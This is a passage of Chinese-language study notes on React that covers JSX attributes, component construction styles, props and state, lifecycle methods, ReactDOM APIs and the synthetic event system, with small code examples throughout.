<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;Checkbox checked=&#123;<span class="literal">false</span>&#125; /&gt;</span><br></pre></td></tr></table></figure>
<p>可以省略为</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;Checkbox /&gt;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>展开属性<br>使用 ES6 rest/spread 特性可以提高开发效率</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> data = &#123; <span class="attr">name</span>: <span class="string">"foo"</span>, <span class="attr">value</span>: <span class="string">"bar"</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> component = <span class="xml"><span class="tag">&lt;<span class="name">Component</span> &#123;<span class="attr">...data</span>&#125; /&gt;</span></span>;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>自定义 HTML 属性<br>往 DOM 元素传入自定义属性，React 是不会渲染的</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">d</span>=<span class="string">"xxx"</span>&gt;</span>content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>需要使用 data-前缀，这和 HTML 标准也是一致的</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-attr</span>=<span class="string">"xxx"</span>&gt;</span>content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然而在自定义标签中，任意属性都是被支持的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;CustomComponent d=&quot;xxx&quot; /&gt;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>JavaScript 属性表达式</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;Person name=&#123;<span class="literal">true</span> ? <span class="number">1</span> : <span class="number">2</span>&#125; /&gt;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>HTML 转义<br>React 会将所有要显示到 DOM 的字符串转义，防止 XSS。如<code>&amp;copy;</code>不会正确显示。<br>可以通过以下方法解决 1.直接使用 UTF-8 字符 2.使用 Unicode 编码 3.使用功数组组装<code>&lt;div&gt;{[&#39;cc &#39;, &lt;span&gt;&amp;copy;&lt;/span&gt;, &#39; 2015&#39;]}&lt;/div&gt;</code> 4.直接插入原始的 HTML</li>
</ol>
<p>React 还提供了 dangerouslySetInnerHTML 属性。它避免了 React 转义字符，请在确定必要的情况下使用它</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div dangerouslySetInnerHTML=&#123;&#123; <span class="attr">__html</span>: <span class="string">"cc &amp;copy; 2015"</span> &#125;&#125; /&gt;</span><br></pre></td></tr></table></figure>
<h1 id="React-组件"><a href="#React-组件" class="headerlink" title="React 组件"></a>React 组件</h1><h2 id="组件的演变"><a href="#组件的演变" class="headerlink" title="组件的演变"></a>组件的演变</h2><p>在 MVC架构出现之前，组件主要分为两种</p>
<ol>
<li>狭义上的组件，又称 UI 组件，主要围绕交互动作上的抽象，利用 JavaScript 操作 DOM 结构或 style 样式来控制</li>
<li>广义上的组件，带有业务含义和数据的 UI 组件组合。它更倾向于采用分层的思想去处理<br>对于 UI 组件，分为 3 部分：结构、样式和交互行为，对应于 HTML、CSS 和 JavaScript.</li>
</ol>
<p>封装的基本思路就是面向对象思想。交互基本上以操作 DOM 为主。逻辑上是结构上哪里需要变，我们就操作哪里。以下是几项规范标准组件的信息。</p>
<ol>
<li>基本的封装性。尽管说 JavaScript 没有真正面向对象的方法，但是我们还是可以通过实例化的方法来制造对象。</li>
<li>简单的生命周期呈现。如 contructor 和 destroy,代表了组件的挂载和卸载过程。</li>
<li>明确的数据流动。这里的数据指的是调用组件的参数。一旦确定参数的值，就会解析传进来的参数，根据参数的不同作出不同的响应。</li>
</ol>
<p>这个阶段，前端在应用级别没有过多复杂的交互。传统组件的主要问题在于结构、样式与行为没有很好地结合，不同参数下的逻辑可能会导致不同的渲染逻辑，这时就会存在大量的 HTML 结构与 style 样式的拼装。逻辑一旦复杂，开发及维护成本相当高。</p>
<p>于是分层思想引进了，出现了 MVC 架构。View 只关心怎么输出变量，所以就诞生了各种各样的模板语言。让模板本身承载逻辑，可以帮我们解决 View 上的逻辑问题。对于组件来说，可以将拼装 HTML 的逻辑部分解耦出去，解决了数据与界面耦合的问题。</p>
<p>模板作为一个 DSL，也有其局限性。在 Angular 中，我们看到了在 HTML 上定义指令的方式。</p>
<p>W3C 将类似的思想制定成了规范,称为 Web Components。它通过定义 Custom Elements(自定义元素)的方式来统一组件。每个自定义元素可以定义自己对外提供的属性、方法,还有事件，内部可以像写一个页面一样，专注于实现功能来完成对组件的封装。</p>
<p>Web Components 由 4 个组成部分：HTML Templates 定义了之前模板的概念，Custom Elements 定义了组件的展现形式，Shadow DOM 定义了组件的作用域范围、可以囊括样式，HTML Imports 提出了新的引入方式。</p>
<p>事实上，它还是需要时间的考验的。因为诸如如何包装在这套规范之上的框架，如何获得在浏览器端的全部支持，怎么与现代应用架构结合等等。但它却是开辟了一条罗马大道，告诉我们组件化可以这样去做。</p>
<h2 id="React-组件的构建"><a href="#React-组件的构建" class="headerlink" title="React 组件的构建"></a>React 组件的构建</h2><p>React 的本质就是关心元素的构成，React 组件即为组件元素。组件元素被描述成纯粹的 JSON 对象，意味着可以使用方法或是类来构建。React 组件基本上由 3 个部分组成-属性(props)、状态(state)以及生命周期方法。</p>
<p>React 组件可以接收参数，也可能有自身状态。一旦接收到的参数或自身状态有所改变，React 组件就会执行相应的生命周期方法，最后渲染。</p>
<p>1.React 与 Web Components<br>从 React 组件上看，它与 Web Components 传达的理念是一致的，但两者的实现方式不同：</p>
<ol>
<li>React 自定义元素是库自己构建的，与 Web Components 规范并不通用；</li>
<li>React 渲染过程包括了模板的概念，即 JSX</li>
<li>React 组件的实现均在方法与类中，因此可以做到相互隔离，但不包括样式。</li>
<li>React 引用方式遵循 ES6 module 标准</li>
</ol>
<p>React 在纯 JavaScript 上下了工夫，将 HTML 结构彻底引入到 JavaScript 中。这种做法褒贬不一，但有效地解决了组件所要解决的问题之一。</p>
<p>2.React 组件的构建方法<br>React 组件基本上由组件的构建方式、组件内的属性状态与生命周期方法组成。</p>
<p>React 组件构建上提供了 3 种不同的方法:React.createClass、ES6 classes 和无状态函数。</p>
<p>React.createClass<br>用 React.createClass 构建组件是 React 最传统、也是兼容性最好的方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Button = React.createClass(&#123;</span><br><span class="line">  getDefaultProps() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      color: <span class="string">"blue"</span>,</span><br><span class="line">      text: <span class="string">"Confirm"</span></span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; color, text &#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;button className=&#123;<span class="string">`btn btn-<span class="subst">$&#123;color&#125;</span>`</span>&#125;&gt;</span><br><span class="line">        &lt;em&gt;&#123;text&#125;&lt;<span class="regexp">/em&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>button&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>ES6 classes<br>ES6 classes 的写法是通过 ES6 标准的类语法的方式来构建方法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Button</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  contructor(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> defaultProps = &#123;</span><br><span class="line">    color: <span class="string">"blue"</span>,</span><br><span class="line">    text: <span class="string">"Confirm"</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; color, text &#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;button className=&#123;<span class="string">`btn btn-<span class="subst">$&#123;color&#125;</span>`</span>&#125;&gt;</span><br><span class="line">        &lt;em&gt;&#123;text&#125;&lt;<span class="regexp">/em&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>button&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与 createClass 的结果相同的是，调用类实现的组件会创建实例对象。</p>
<p>我们很容易联想到组件抽象过程中也可以使用继承的思路。在实际应用中，我们极少让子类去继承功能组件。继承牵一发而动全身。在 React 组件开发中，常用的方式是将组件拆分到合理的粒度，用组合的方式合成业务组件。</p>
<p>说明：React 的所有组件都继承自顶层类 React.Component。它的定义非常简洁，只是初始化了 React.Component 方法，声明了 props、context、refs 等，并在原型上定义了 setState 和 foreUpdate 方法。内部初始化的生命周期方法与 createClass 方式使用的是同一个方法创建的。</p>
<p>无状态函数<br>使用无状态函数构建的组件称为无状态组件<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Button</span>(<span class="params">&#123; color = <span class="string">"blue"</span>, text = <span class="string">"Confirm"</span> &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;button className=&#123;<span class="string">`btn btn-<span class="subst">$&#123;color&#125;</span>`</span>&#125;&gt;</span><br><span class="line">      &lt;em&gt;&#123;text&#125;&lt;<span class="regexp">/em&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>button&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>无状态组件只传入 props 和 context 两个参数；也就是说，它不存在 state，也没有生命周期方法，组件本身即上面两种 React 组件构建方法中的 render。不过，像 propTypes 和 defaultProps 还是可以通过向方法设置静态属性来实现的。</p>
<p>无状态组件不像上述两种方法在调用时会创建新实例，它创建时始终保持了一个实例，避免了不必要的检查和内存分配。</p>
<h1 id="React-数据流"><a href="#React-数据流" class="headerlink" title="React 数据流"></a>React 数据流</h1><p>在 React 中，数据是自顶向下单向流动的，即从父组件到子组件。</p>
<p>state 与 props 是组件中最重要的概念。如果顶层组件初始化 props，那么 React 会向下遍历整棵组件树，重新尝试渲染所有相关的子组件。state 只关心组件自己内部的状态，这些状态只能在组件内改变。把组件看成一个函数，props 就是它的参数，内部由 state 作为函数的内部参数，返回一个 Virtual DOM 的实现。</p>
<h2 id="state"><a href="#state" class="headerlink" title="state"></a>state</h2><p>在 React 中，state 为组件内部状态。当组件内部使用 setState 方法时，该组件会尝试重新渲染。</p>
<p>值得注意的，setState 是一个异步方法，一个生命周期内所有的 setState 方法会合并操作。</p>
<p>我们思考一个常规的 Tabs 组件，对于 activeIndex 作为 state，就有两种不同的视角。</p>
<ol>
<li>在内部更新。当我们切换 tab 标签时，可以看作是组件内部的交互行为，被选择后通过回调函数返回具体选择的索引。</li>
<li>在外部更新。当我们切换 tab 标签时，可以看作是组件外部在传入具体的索引，而组件就像“木偶”一样被操控着。<br>这两种情形在 React 组件的设计中非常常见，我们分别称为智能组件和木偶组件</li>
</ol>
<p>当然，实现组件时，可以同时考虑兼容这两种</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">  <span class="keyword">super</span>(props);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> currProps = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> activeIndex = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 来源于需要外部更新的</span></span><br><span class="line">  <span class="keyword">if</span> (activeIndex <span class="keyword">in</span> currProps) &#123;</span><br><span class="line">    activeIndex = currProps.activeIndex;</span><br><span class="line">    <span class="comment">// 来源于使用内部更新的</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">'defaultActiveIndex'</span> <span class="keyword">in</span> currProps) &#123;</span><br><span class="line">    activeIndex = currProps.defaultActiveIndex;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.state = &#123;</span><br><span class="line">    activeIndex,</span><br><span class="line">    prevIndex: activeIndex,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="props"><a href="#props" class="headerlink" title="props"></a>props</h2><p>props 是 React 用来让组件之间互相联系的一种机制，通俗地说就像方法的参数一样。</p>
<p>props 的传递过程，对于 React 组件来说非常直观。React 的单向数据流，主要的流动管道就是 props。props 本身是不可变的。组件的 props 一定来自于默认属性或通过父组件传递而来。</p>
<p>React 为 props 提供了默认配置，通过 defaultProps 静态变量的方式来定义。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> defaultProps = &#123;</span><br><span class="line">  classPrefix: <span class="string">'tabs'</span>,</span><br><span class="line">  onChange: <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="子组件-prop"><a href="#子组件-prop" class="headerlink" title="子组件 prop"></a>子组件 prop</h2><p>在 React 中有一个重要且内置的 props——children，它代表组件的子组件集合。</p>
<p>实现的基本思路以 TabContent 组件渲染 TabPane 子组件集合为例来讲</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">getTabPanes() &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; classPrefix, activeIndex, panels, isActive &#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> React.Children.map(panels, (child) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (!child) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> order = <span class="built_in">parseInt</span>(child.props.order, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> React.cloneElement(child, &#123;</span><br><span class="line">      classPrefix,</span><br><span class="line">      isActive,</span><br><span class="line">      children: child.props.children,</span><br><span class="line">      key: <span class="string">`tabpane-<span class="subst">$&#123;order&#125;</span>`</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>它是通过 React.Children.map 方法遍历子组件，同时利用 React 的 cloneElement 方法克隆到 TabPane 组件，最后返回这个 TabPane 组件集合。</p>
<p>React.Children 是 React 官方提供的一系列操作 children 的方法。它提供诸如 map、forEach、count 等实用函数。<br>使用 getTabPanes</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">render () &#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;this.getTabPanes()&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假如我们把 render 方法中的 this.getTabPanes 方法中对子组件的遍历直接放进去</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">render() &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">&lt;div&gt;&#123;React.Children.map(<span class="keyword">this</span>.props.children, (child</span>) =&gt;</span> &#123;...&#125;)&#125;&lt;<span class="regexp">/div&gt;)</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p>这种调用方式称为 Dynamic Children（动态子组件）。</p>
<h2 id="组件props"><a href="#组件props" class="headerlink" title="组件props"></a>组件props</h2><p>也可以将子组件以props的形式传递。一般我们会用这种方法让开发者定义组件的某一个prop，让其具备多种类型，来做到简单配置和自定义配置组合在一起的效果。</p>
<h2 id="用function-prop与父组件通信"><a href="#用function-prop与父组件通信" class="headerlink" title="用function prop与父组件通信"></a>用function prop与父组件通信</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.props.onChange(activeIndex, prevIndex)</span><br></pre></td></tr></table></figure>
<p>触发了onChange prop回调函数给父组件必要的值。</p>
<h2 id="propTypes"><a href="#propTypes" class="headerlink" title="propTypes"></a>propTypes</h2><p>propTypes用于规范props的类型与必需的状态。它会在开发环境下，对组件的prop值的类型作检查。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> propTypes = &#123;</span><br><span class="line">  classPrefix: React.PropTypes.string,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>propTypes有很多类型支持，不仅有基本类型，还包括枚举和自定义类型。</p>
<h1 id="React生命周期"><a href="#React生命周期" class="headerlink" title="React生命周期"></a>React生命周期</h1><h2 id="挂载和卸载过程"><a href="#挂载和卸载过程" class="headerlink" title="挂载和卸载过程"></a>挂载和卸载过程</h2><p>1.组件的挂载<br>这个过程主要做组件状态的初始化，我们推荐以下面例子为模板写初始化组件：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component, PropTypes &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> propTypes = &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> defaultProps = &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentWillMount() &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render () &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>This is a demo<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果我们在componentWillMount中执行setState方法，组件会更新state，但组件只渲染一次。因此，这是无意义的执行，完全可以放在constructor初始化state中。<br>如果我们在componentDidMount中执行setState方法，组件会再次更新，不过在初始化过程就渲染了两次组件，这并不是一次好事。但实际情况，有一些场景必须这么做，比如需要获取组件的位置。</p>
<ol start="2">
<li>组件的卸载<br>componentWillUnmount，我们常常会执行一些清理方法，比如事件回收、清除定时器。</li>
</ol>
<h2 id="数据更新过程"><a href="#数据更新过程" class="headerlink" title="数据更新过程"></a>数据更新过程</h2><p>更新过程指的是父组件向下传递props或组件自身执行setState方法时发生的一系列更新动作。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component, PropTypes &#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  componentWillReceiveProps(nextProps) &#123;</span><br><span class="line">    <span class="comment">// this.setState(&#123;&#125;)</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  shouldComponentUpdate(nextProps, nextState) &#123;</span><br><span class="line">    <span class="comment">// return true</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentWillUpdate(nextProps, nextState) &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentDidUpdate(prevProps, prevState) &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果组件自身的state更新了，会依次执行shouldComponentUpdate、componentWillUpdate、render和componentDidUpdate</p>
<p>shouldComponentUpdate接收需要更新的props和state，让开发者增加判断逻辑，不需要更新方法最终返回false即可，这是性能优化的手段之一。</p>
<p>无状态组件是没有生命周期方法的，这也意味着它没有shouldComponentUpdate。渲染该类组件，每次都会重新渲染。</p>
<p>componentWillUpdate方法提供的是需要更新的props和state，而componentDidUpdate提供更新前的props和state。</p>
<p>注意不能在componentWillUpdate执行setState方法，会导致循环执行render。</p>
<p>如果组件是由父组件更新props而更新的，那么在shouldComponentUpdate之前会先执行componentWillRecieveProps方法。此方法可以作为React在props传入后，渲染之前setState的机会，在此方法中调用setState是不会二次渲染的。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">componentWillReceiveProps(nextProps) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="string">'activeIndex'</span> <span class="keyword">in</span> nextProps) &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      activeIndex: nextProps.activeIndex</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="React与DOM"><a href="#React与DOM" class="headerlink" title="React与DOM"></a>React与DOM</h1><h2 id="ReactDOM"><a href="#ReactDOM" class="headerlink" title="ReactDOM"></a>ReactDOM</h2><p>ReactDOM中的API非常少，只有findDOMNode、unmountComponentAtNode和render。<br>1.findDOMNode<br>Reactz提供的获取DOM元素的方法有两种，其中一种就是ReactDOM提供的findDOMNode：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DOMElement findDOMNode(ReactComponent component)</span><br></pre></td></tr></table></figure></p>
<p>当组件被渲染到DOM后，findDOMNode返回该React组件实例相应的DOM节点。它可以用于获取表单的value以及用于DOM的测量。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    <span class="keyword">const</span> dom = ReactDOM.findDOMNode(<span class="keyword">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="render"><a href="#render" class="headerlink" title="render"></a>render</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ReactComponent render(</span><br><span class="line">  ReactElement element,</span><br><span class="line">  DOMElement container,</span><br><span class="line">  [<span class="function"><span class="keyword">function</span> <span class="title">callback</span>]</span></span><br><span class="line"><span class="function">)</span></span><br></pre></td></tr></table></figure>
<p>该方法把元素挂载到container中，并且返回element的实例（即refs引用）。如果是无状态组件，render会返回null。当组件装载完毕时，callback被调用。</p>
<p>与render相反，React还提供了一个很少使用的unmountComponentAtNode方法来进行卸载操作。</p>
<h2 id="ReactDOM的不稳定方法"><a href="#ReactDOM的不稳定方法" class="headerlink" title="ReactDOM的不稳定方法"></a>ReactDOM的不稳定方法</h2><p>unstable_renderSubtreeIntoContainer。它可以更新组件到传入的DOM节点。它与render方法相比，区别在于是否传入父节点。</p>
<p>另一个ReactDOM中的不稳定方法unstable_batchedUpdates是关于setState更新策略的。</p>
<h2 id="refs"><a href="#refs" class="headerlink" title="refs"></a>refs</h2><p>它是React组件中非常特殊的prop，可以附加到任何一个组件上。组件被调用时会新建一个该组件的实例，而refs就会指向这个实例。</p>
<p>findDOMNode和refs都无法用于无状态组件中，无状态组件挂载只是方法调用，没有新建实例。</p>
<h2 id="React之外的DOM操作"><a href="#React之外的DOM操作" class="headerlink" title="React之外的DOM操作"></a>React之外的DOM操作</h2><p>调用HTML5 Audio/Video的play方法和input的focus方法，React就无能为力了，需要使用相应的DOM方法来实现。</p>
<p>还有组件以外区域（一般指document、body）的事件绑定、DOM的尺寸计算。</p>
<h1 id="事件系统"><a href="#事件系统" class="headerlink" title="事件系统"></a>事件系统</h1><p>React基于Virtual DOM实现了一个SyntheticEvent(合成事件)层，我们定义的处理器会接收一个SyntheticEvent对象的实例，它完全符合W3C标准，不会存在任何IE的兼容性问题。并且与原生的浏览器事件一样拥有同样的接口，同样支持事件的冒泡机制，我门可以使用stopPropagation()和preventDefault()来中断它。如果需要访问原生事件对象，可以使用nativeEvent属性。</p>
<h2 id="合成事件的绑定方式"><a href="#合成事件的绑定方式" class="headerlink" title="合成事件的绑定方式"></a>合成事件的绑定方式</h2><p>React事件的绑定方式与原生的HTML事件监听器属性很相似。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;button onClick=&#123;<span class="keyword">this</span>.handleClick&#125;&gt;Test&lt;<span class="regexp">/button&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="合成事件的实现机制"><a href="#合成事件的实现机制" class="headerlink" title="合成事件的实现机制"></a>合成事件的实现机制</h2><p>在React底层，主要对合成事件做了两件事：事件委派和自动绑定。</p>
<p>1.事件委派</p>
<p>React不会把事件处理函数直接绑定到真实的节点上，而是把所有事件绑定到结构的最外层，使用一个统一的事件监听器，这个事件监听器上维持了一个映射来保存所有组件内部的事件监听和处理函数。当组件挂载或卸载时，只是在这个统一的事件监听器上插入或删除一些对象；当事件发生时，首先被这个统一的事件监听器处理，然后在映射里找到真正的事件处理函数并调用。（实现原理：对最外层的容器进行绑定，依赖事件的冒泡机制完成委派。）这样简化了事件处理和回收机制，效率也有很大提升。</p>
<p>2.自定绑定</p>
<p>在React组件中，每个方法的上下文都会指向该组件的实例，即自定绑定this为当前组件。而且React还会对这种引用进行缓存。在使用ES6 classes或者纯函数时，这种自定绑定就不复存在了，我们需要手动实现this的绑定。<br>我们来看几种绑定方法<br>bind方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  constuctor() &#123;</span><br><span class="line">    <span class="keyword">super</span>(props)</span><br><span class="line">    <span class="keyword">this</span>.handleClick = <span class="keyword">this</span>.handleClick.bind(<span class="keyword">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>箭头函数可以自动绑定此函数的作用域的this<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  handleClick= <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="在React中使用原生事件"><a href="#在React中使用原生事件" class="headerlink" title="在React中使用原生事件"></a>在React中使用原生事件</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NativeEventDemo</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    <span class="keyword">this</span>.refs.button.addEventListener(<span class="string">'click'</span>, <span class="keyword">this</span>.handleClick)</span><br><span class="line">  &#125;</span><br><span class="line">  componentWillUnmout() &#123;</span><br><span class="line">    <span class="keyword">this</span>.refs.button.removeEventListener(<span class="string">'click'</span>, <span class="keyword">this</span>.handleClick)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="对比React合成事件与JavaScript原生事件"><a href="#对比React合成事件与JavaScript原生事件" class="headerlink" title="对比React合成事件与JavaScript原生事件"></a>对比React合成事件与JavaScript原生事件</h2><p>1.事件传播与阻止事件传播</p>
<p>浏览器原生DOM事件的传播可以分为3个阶段：事件捕获阶段、目标对象本身的事件处理程序调用、事件冒泡。可以将e.addEventListener的第三个参数设置为true时，为元素e注册捕获事件处理程序。事件捕获在IE9以下无法使用。事件捕获在应用程序开发中意义不大，React在合成事件中并没有实现事件捕获，仅仅支持了事件冒泡机制。</p>
<p>阻止原生事件传播需要使用e.stopPropagation，不过对于不支持该方法的浏览器（IE9以下）只能使用e.cancelBubble = true来阻止。而在React合成事件中，只需要使用stopPropagation()即可。阻止React事件冒泡的行为只能用于React合成事件系统中，且没有办法阻止原生事件的冒泡。反之，原生事件阻止冒泡，可以阻止React合成事件的传播。</p>
<p>2.事件类型</p>
<p>React合成事件的事件类型是JavaScript原生事件类型的一个子集。它仅仅实现了DOM Level3的事件接口，并且统一了浏览器的兼容问题。有些事件React没有实现，或者受某些限制没办法去实现，如window的resize事件。</p>
<p>3.事件绑定方式</p>
<p>受到DOM标准影响，浏览器绑定原生事件的方式有很多种。React合成事件的绑定方式则简单很多<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;button onClick=&#123;<span class="keyword">this</span>.handleClick&#125;&gt;Test&lt;<span class="regexp">/button&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>4.事件对象</p>
